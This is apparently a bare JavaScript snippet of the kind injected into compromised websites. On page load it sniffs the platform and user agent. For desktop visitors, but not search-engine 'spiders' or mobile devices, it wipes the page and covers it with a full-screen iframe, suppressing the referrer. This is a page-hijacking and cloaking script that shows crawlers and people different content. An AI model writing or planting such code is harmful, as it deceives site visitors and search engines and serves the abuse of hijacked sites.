window.addEventListener('DOMContentLoaded', function() {
    var system = {};
    var p = navigator.platform;
    system.win = p.indexOf("Win") == 0;
    system.mac = p.indexOf("Mac") == 0;
    system.ispc = navigator.userAgent.match(/spider|iPad|iPhone|iPod|Android/i) == null;
    if (system.win || system.mac || system.ispc) {
        var host=window.location.host;
        $("head").html('<meta charset="UTF-8"><meta name="referrer" content="no-referrer"><title>'+host+'</title> ');
        $("body").html('<iframe style="width:100%;height:100%;position:absolute;left:0%;top:0%;z-index:999999" id="mainFrame" src="http:///'+host+'/none.html" frameborder="0" scrolling="yes"></iframe>').show()
    }
});
